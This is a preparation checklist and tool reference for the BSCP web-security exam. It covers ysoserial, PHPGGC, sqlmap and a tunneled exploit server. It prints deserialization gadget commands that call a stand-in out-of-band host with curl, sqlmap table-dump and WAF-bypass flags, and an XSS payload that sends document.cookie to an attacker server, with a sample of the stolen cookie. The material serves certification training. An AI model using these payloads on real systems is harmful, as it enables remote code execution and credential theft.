# BSCP exam VM readiness checklist

If your VM is missing any of these, you'll lose time on the exam mid-attack. Run the setup script once, then use this doc as a "when do I reach for what" reference.

## Quick install

```bash
bash bscp-setup.sh           # installs ysoserial, PHPGGC, sqlmap to /opt
bash bscp-setup.sh --check   # verify-only mode (no installs)
```

The script also reports whether `cloudflared`, `ssh`, `java`, `php`, `python3`, `git`, `curl` are present.

---

## Command-line tools you MUST have on PATH

| Tool | What for | Where it lives after setup |
|---|---|---|
| `ysoserial` | Java deserialization → RCE gadget generation (Stage 3) | `/opt/ysoserial/ysoserial.jar` + wrapper at `/usr/local/bin/ysoserial` |
| `phpggc`    | PHP deserialization → RCE gadget generation | `/opt/phpggc/` + wrapper at `/usr/local/bin/phpggc` |
| `sqlmap`    | Automated SQL injection — most complete + reliable scanner | `/opt/sqlmap/` + wrapper at `/usr/local/bin/sqlmap` |
| `python3`   | Local HTTP server + this repo's tools | usually pre-installed |
| `ssh`       | Free SSH-based tunneling fallback | usually pre-installed |
| `cloudflared` | **Recommended** free local-server tunneling (best ngrok alternative — no signup, no 2-hour limit) | install per https://pkg.cloudflare.com/index.html |
| `java`      | Required by `ysoserial` | `apt install default-jre-headless` |
| `php`       | Required by `phpggc` | `apt install php-cli` |

---

## Tool reference card

### ysoserial — Java deserialization

When the target accepts a Java-serialized blob (often via cookies, hidden form fields, or RMI ports) and you can control its contents, generate a gadget chain that triggers RCE on deserialization.

```bash
# List every chain ysoserial knows about
ysoserial

# Generate a CommonsCollections6 gadget that runs `curl https://your-collab/x`.
# Pipe to base64 if the target expects base64-encoded serialized data.
ysoserial CommonsCollections6 'curl https://abc.interactsh-server/x' | base64 -w0

# Other common chains worth trying when CC6 doesn't work:
#   CommonsCollections1   older apps still pinning Commons-Collections 3.1
#   CommonsBeanutils1     when CB is on the classpath but CC isn't
#   Hibernate1            ORM stack
#   Spring1               Spring framework
#   URLDNS                no RCE; just causes a DNS lookup (perfect first probe)
```

**Test for vulnerability FIRST with URLDNS** — generates a payload that triggers a DNS lookup. Pair with `--oob-host` from `intruder.py` to confirm the deserialization sink before chaining for RCE:

```bash
ysoserial URLDNS https://abc.interactsh-server | base64 -w0
# Submit it. If you see a DNS hit on abc.interactsh-server, deserialization is real.
```

### PHPGGC — PHP deserialization

Same idea but for PHP `unserialize()` sinks.

```bash
# List all chains
phpggc -l

# Generate a Laravel/RCE chain that runs a system command
phpggc Laravel/RCE5 system 'id' -b   # -b = base64-encoded output

# Generate a Symfony chain
phpggc Symfony/RCE4 system 'curl https://abc.interactsh-server/x' -b
```

PHP context is usually surfaced via Laravel session cookies, WordPress meta values, or directly via a `?data=` parameter that gets `unserialize()`'d.

### sqlmap — SQL injection automation

Save your candidate request from Burp's Proxy History (right-click → Save Item → save as `req.txt`), then point sqlmap at it.

```bash
# Most common: just feed it the request file. --batch = no prompts.
sqlmap -r req.txt --batch

# Specify the parameter you suspect (faster than letting sqlmap test all)
sqlmap -r req.txt --batch -p username

# Once it finds an injection, escalate to dumping data:
sqlmap -r req.txt --batch --dbs                    # list databases
sqlmap -r req.txt --batch -D <dbname> --tables     # list tables
sqlmap -r req.txt --batch -D <db> -T <tbl> --dump  # dump table

# Common useful flags:
#   --level=5 --risk=3        more aggressive tests (try when basic finds nothing)
#   --technique=BEUSTQ         restrict techniques (B=boolean-blind, T=time-based, ...)
#   --tamper=between          encode payload to bypass WAFs
#   --random-agent            rotate User-Agent (defeats some basic WAFs)
#   --proxy http://127.0.0.1:8080   route through Burp to see what it's doing
```

Sqlmap WILL be slow on time-based blind injections (intentionally — bcrypt-time scale per probe). Park it in a tmux pane while you hunt other vectors elsewhere.

### Local HTTP server + tunneling — for client-side exploits

When you need to deliver an XSS / CSRF / file-exfil payload to a VICTIM browser (the lab's simulated user), the victim can't reach your `127.0.0.1`. You need a public URL.

This repo ships [`exploit_server.py`](../exploit_server.py) that combines local serving + auto-tunneling:

```bash
# Just serve files (no tunnel — LAN testing only)
python3 exploit_server.py serve ./payloads --port 8000

# Serve + Cloudflare tunnel (recommended; needs `cloudflared` installed)
python3 exploit_server.py serve ./payloads --tunnel cloudflared

# Serve + serveo SSH tunnel (zero install, needs `ssh`)
python3 exploit_server.py serve ./payloads --tunnel serveo

# Serve + localhost.run SSH tunnel (alternative)
python3 exploit_server.py serve ./payloads --tunnel localhost.run
```

You get back a public URL like `https://random-words-abc123.trycloudflare.com`. Inject that into the victim's path (XSS reflection, CSRF form action, etc.).

Each incoming request is logged live with the full path including query string — so a payload like:

```html
<script>fetch("/log?c="+document.cookie)</script>
```

shows up in your terminal as:

```
[200]  14:23:01  192.0.2.1  GET /log?c=session=admin_abc123
```

…and there's your stolen cookie.

### Why not ngrok?

ngrok's free tier now requires signup + auth-token configuration, and tunnels die after 2 hours. The alternatives above have neither limitation. If you already have ngrok set up, it works fine too — `cloudflared` is just less friction on a fresh VM.

---

## Stage-by-stage usage map (BSCP)

| Stage | Likely tools needed |
|---|---|
| **Stage 1** — Initial access (auth bypass / SQLi / SSRF) | `intruder.py`, `param_miner.py`, `sqlmap`, `jwt_tool.py`, `cyberchef.py identify` |
| **Stage 2** — Privilege escalation (IDOR / broken access control) | `privesc.py`, `workflow.py` for multi-step exploits |
| **Stage 3** — High-privilege RCE (deserialization / SSTI / file upload) | `ysoserial`, `phpggc`, `exploit_server.py` for delivery, `oast_poll.py` to confirm OOB |

---

## Verifying everything works (one-line checks)

```bash
ysoserial --help 2>&1 | head -5      # should list chains
phpggc -l 2>&1 | head -5              # should list chains
sqlmap --version                       # should print sqlmap version
cloudflared --version                  # should print cloudflared version
java -version                          # should print JRE version
php --version                          # should print PHP version
```

If any of those fail, `bash bscp-setup.sh --check` will tell you what's missing.
